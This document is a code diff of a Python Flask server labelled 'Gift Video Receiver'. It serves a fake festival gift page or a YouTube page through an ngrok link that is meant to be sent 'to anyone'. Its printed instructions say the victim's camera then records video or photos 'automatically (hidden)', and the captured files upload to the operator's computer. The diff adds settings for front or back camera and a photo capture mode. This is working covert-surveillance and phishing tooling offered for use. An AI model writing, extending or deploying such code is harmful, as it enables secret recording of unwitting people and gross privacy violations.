@@ -1,8 +1,6 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver Server - Dual Mode
-YouTube mode: Just shows video with hidden camera
-Festival mode: Gift page with festival name
+Gift Video Receiver Server - Complete Terminal Menu
 """
 
 import os
@@ -13,6 +11,7 @@ import subprocess
 import threading
 import urllib.parse
 import urllib.request
+import re
 from datetime import datetime
 from pathlib import Path
 from flask import Flask, request, jsonify, send_file
@@ -32,11 +31,10 @@ YOUTUBE_HTML = 'youtube.html'
 app = Flask(__name__)
 CORS(app)
 
-received_videos = []
+received_files = []
 
 @app.route('/festival')
 def festival_page():
-    """Serve the festival HTML page"""
     try:
         with open(FESTIVAL_HTML, 'r') as f:
             return f.read()
@@ -45,7 +43,6 @@ def festival_page():
 
 @app.route('/youtube')
 def youtube_page():
-    """Serve the YouTube HTML page"""
     try:
         with open(YOUTUBE_HTML, 'r') as f:
             return f.read()
@@ -53,35 +50,43 @@ def youtube_page():
         return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404
 
 @app.route('/upload', methods=['POST'])
-def upload_video():
-    """Receive and save the uploaded video"""
+def upload_media():
     try:
-        if 'video' not in request.files:
-            return jsonify({'error': 'No video file'}), 400
+        if 'media' not in request.files:
+            return jsonify({'error': 'No media file'}), 400
         
-        video_file = request.files['video']
-        if video_file.filename == '':
+        media_file = request.files['media']
+        if media_file.filename == '':
             return jsonify({'error': 'No filename'}), 400
 
+        media_type = request.form.get('type', 'unknown')
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        filename = f"video_{timestamp}.webm"
+        
+        # Determine extension
+        if media_type == 'photo':
+            ext = 'jpg'
+        else:
+            ext = 'webm'
+        
+        filename = f"{media_type}_{timestamp}.{ext}"
         filepath = os.path.join(UPLOAD_FOLDER, filename)
 
-        video_file.save(filepath)
+        media_file.save(filepath)
         
-        video_info = {
+        file_info = {
             'filename': filename,
             'path': filepath,
+            'type': media_type,
             'timestamp': timestamp,
             'size': os.path.getsize(filepath)
         }
-        received_videos.append(video_info)
+        received_files.append(file_info)
         
-        print(f"\n📹 Received video {len(received_videos)}")
+        print(f"\n📹 Received {media_type} {len(received_files)}")
         print(f"   📁 {filename}")
-        print(f"   📊 {video_info['size']:,} bytes")
+        print(f"   📊 {file_info['size']:,} bytes")
         
-        # Auto-open the video
+        # Auto-open the file
         try:
             if sys.platform == 'linux':
                 subprocess.run(['xdg-open', filepath], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
@@ -96,12 +101,12 @@ def upload_video():
         print(f"❌ Error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/videos', methods=['GET'])
-def list_videos():
-    return jsonify({'videos': received_videos})
+@app.route('/files', methods=['GET'])
+def list_files():
+    return jsonify({'files': received_files})
 
 @app.route('/download/<filename>', methods=['GET'])
-def download_video(filename):
+def download_file(filename):
     filepath = os.path.join(UPLOAD_FOLDER, filename)
     if os.path.exists(filepath):
         return send_file(filepath, as_attachment=True)
@@ -122,7 +127,6 @@ class GiftServer:
         Path(UPLOAD_FOLDER).mkdir(exist_ok=True)
 
     def check_html_files(self):
-        """Check if HTML files exist"""
         if not os.path.exists(FESTIVAL_HTML):
             print(f"\n❌ Error: {FESTIVAL_HTML} not found!")
             return False
@@ -131,8 +135,38 @@ class GiftServer:
             return False
         return True
 
-    def show_menu(self):
-        """Show terminal menu and get user choice"""
+    def get_camera_type(self):
+        """Get camera type from user"""
+        print("\n📷 Select camera type:")
+        print("  1. Front Camera")
+        print("  2. Back Camera")
+        
+        while True:
+            choice = input("\nEnter choice (1 or 2): ").strip()
+            if choice == '1':
+                return 'user'
+            elif choice == '2':
+                return 'environment'
+            else:
+                print("❌ Invalid choice. Enter 1 or 2")
+
+    def get_capture_mode(self):
+        """Get capture mode from user"""
+        print("\n📸 Select capture mode:")
+        print("  1. Video - Record 15 second video")
+        print("  2. Photo - Capture 5 photos")
+        
+        while True:
+            choice = input("\nEnter choice (1 or 2): ").strip()
+            if choice == '1':
+                return 'video', 15, 0
+            elif choice == '2':
+                return 'photo', 0, 5
+            else:
+                print("❌ Invalid choice. Enter 1 or 2")
+
+    def show_main_menu(self):
+        """Show main menu and get user choice"""
         print("\n" + "="*60)
         print("🎁 GIFT VIDEO RECEIVER")
         print("="*60)
@@ -151,7 +185,6 @@ class GiftServer:
                 print("❌ Invalid choice. Enter 1 or 2")
 
     def get_festival_name(self):
-        """Get festival/gift name from user"""
         name = input("\n📝 Enter festival/gift name: ").strip()
         if not name:
             name = "Surprise"
@@ -159,14 +192,11 @@ class GiftServer:
         return name
 
     def get_youtube_video(self):
-        """Get YouTube video ID from user"""
         print("\n🎬 Enter YouTube video URL or ID:")
         print("   (Press Enter for default video)")
         video = input("   ▶ ").strip()
         
-        # Extract video ID if URL is provided
         if video and ('youtube.com' in video or 'youtu.be' in video):
-            import re
             patterns = [
                 r'(?:youtube\.com\/watch\?v=)([^&]+)',
                 r'(?:youtu\.be\/)([^?]+)',
@@ -179,22 +209,21 @@ class GiftServer:
                     break
         
         if not video:
-            video = "dQw4w9WgXcQ"  # Rick Astley - Never Gonna Give You Up
+            video = "dQw4w9WgXcQ"
             print(f"   Using default video ID: {video}")
         else:
             print(f"   Using video ID: {video}")
         
         return video
 
-    def generate_link(self, mode, name=None, video_id=None):
-        """Generate the appropriate link based on mode"""
+    def generate_link(self, mode, name=None, video_id=None, camera='user', capture_mode='video', duration=15, photos=5):
         base_url = self.ngrok_url
         
         if mode == 'festival':
-            link = f"{base_url}/festival?name={urllib.parse.quote(name)}"
+            link = f"{base_url}/festival?name={urllib.parse.quote(name)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
             mode_name = "🎊 Festival Mode"
         else:
-            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}"
+            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&camera={camera}&mode={capture_mode}&duration={duration}&photos={photos}"
             mode_name = "🎬 YouTube Mode"
         
         return link, mode_name
@@ -266,21 +295,24 @@ class GiftServer:
         time.sleep(2)
         print("✅ Server running")
 
-    def wait_for_videos(self):
-        print("\n🎁 Waiting for videos... (Press Ctrl+C to stop)")
-        print(f"📁 Videos saved in: {UPLOAD_FOLDER}/")
+    def wait_for_files(self):
+        print("\n🎁 Waiting for files... (Press Ctrl+C to stop)")
+        print(f"📁 Files saved in: {UPLOAD_FOLDER}/")
         print("-"*50)
-        print("\n⏳ Waiting for first video...")
+        print("\n⏳ Waiting for first file...")
         
         try:
             last_count = 0
             while self.running:
-                current_count = len(received_videos)
+                current_count = len(received_files)
                 
                 if current_count > last_count:
-                    print(f"\n📹 Received video {current_count}")
+                    file_info = received_files[-1]
+                    print(f"\n📹 Received {file_info['type']} {current_count}")
+                    print(f"   📁 {file_info['filename']}")
+                    print(f"   📊 {file_info['size']:,} bytes")
                     last_count = current_count
-                    print(f"\n⏳ Waiting for next video...")
+                    print(f"\n⏳ Waiting for next file...")
                 
                 time.sleep(1)
                 
@@ -307,18 +339,22 @@ class GiftServer:
             if not self.check_ngrok():
                 return
             
-            # Show menu and get choice
-            mode = self.show_menu()
+            # Step 1: Main menu (Festival or YouTube)
+            mode = self.show_main_menu()
             
-            # Get details based on mode
+            # Step 2: Camera type
+            camera = self.get_camera_type()
+            
+            # Step 3: Capture mode (Video or Photo)
+            capture_mode, duration, photos = self.get_capture_mode()
+            
+            # Step 4: Get specific details
             if mode == 'festival':
                 name = self.get_festival_name()
                 video_id = None
-                mode_display = "🎊 Festival Mode"
             else:
                 video_id = self.get_youtube_video()
                 name = None
-                mode_display = "🎬 YouTube Mode"
             
             # Start server
             self.start_flask()
@@ -326,7 +362,7 @@ class GiftServer:
                 return
             
             # Generate link
-            link, mode_name = self.generate_link(mode, name, video_id)
+            link, mode_name = self.generate_link(mode, name, video_id, camera, capture_mode, duration, photos)
             
             # Display the link
             print("\n" + "="*60)
@@ -335,29 +371,43 @@ class GiftServer:
             print(f"\n🔗 {link}")
             print("\n" + "="*60)
             
+            # Instructions
+            print("\n📋 Configuration Summary:")
+            print(f"   🎯 Mode: {mode_name}")
+            print(f"   📷 Camera: {'Front' if camera == 'user' else 'Back'}")
+            print(f"   📸 Capture: {'Video (' + str(duration) + 's)' if capture_mode == 'video' else 'Photo (' + str(photos) + ' photos)'}")
+            
             if mode == 'festival':
-                print("\n📋 Instructions:")
+                print(f"   🎊 Festival Name: {name}")
+            else:
+                print(f"   🎬 Video ID: {video_id}")
+            
+            print("\n📋 Instructions:")
+            if mode == 'festival':
                 print("   1. Send the link above to anyone")
                 print("   2. They see a festival/gift page")
                 print("   3. They click 'Open Your Gift'")
-                print("   4. They grant camera permission")
-                print("   5. 15-second video auto-records (hidden)")
-                print("   6. Video saves to your computer!")
-                print(f"\n🎊 Festival Name: {name}")
+                print("   4. Camera records automatically (hidden)")
+                if capture_mode == 'video':
+                    print(f"   5. Records {duration} second video")
+                else:
+                    print(f"   5. Captures {photos} photos")
+                print("   6. Files save to your computer!")
             else:
-                print("\n📋 Instructions:")
                 print("   1. Send the link above to anyone")
                 print("   2. They see a YouTube video playing")
                 print("   3. Camera records automatically (hidden)")
-                print("   4. 15-second video auto-records")
-                print("   5. Video saves to your computer!")
-                print(f"\n🎬 YouTube Video ID: {video_id}")
+                if capture_mode == 'video':
+                    print(f"   4. Records {duration} second video")
+                else:
+                    print(f"   4. Captures {photos} photos")
+                print("   5. Files save to your computer!")
             
             print("="*60)
             print("\n📋 Link printed above - copy it manually")
-            print(f"📁 Videos saved in: {UPLOAD_FOLDER}/")
+            print(f"📁 Files saved in: {UPLOAD_FOLDER}/")
             
-            self.wait_for_videos()
+            self.wait_for_files()
             
         except KeyboardInterrupt:
             print("\n\n👋 Goodbye!")
